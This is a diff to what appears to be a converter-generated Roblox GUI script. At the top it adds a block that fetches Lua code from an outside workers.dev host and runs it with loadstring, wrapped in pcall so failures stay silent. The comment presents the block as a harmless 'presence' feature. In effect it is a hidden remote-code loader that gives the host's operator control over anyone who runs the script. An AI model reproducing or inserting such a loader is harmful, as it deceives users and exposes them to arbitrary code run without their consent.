@@ -1,3 +1,10 @@
+-- HPX Presence: registra o jogador sem expor o painel privado.
+pcall(function()
+    local source = game:HttpGet("https://hpx.hopezinhoo.workers.dev/presence.lua")
+    local loader = loadstring(source)
+    if loader then loader() end
+end)
+
 -- NOTE: THIS FILE IS TOO BIG TO FIT IN ONE SCRIPT SO IT IS SPLIT UP IN THIS FOLDER, COPY EACH SCRIPT AFTER ANOTHER TO FORM THE FULL SCRIPT (EX: Split_1, then Split_2, then Split_3, etc.)-- Generated using RoadToGlory's Converter v1.1 (RoadToGlory#9879)
 
 -- Instances:
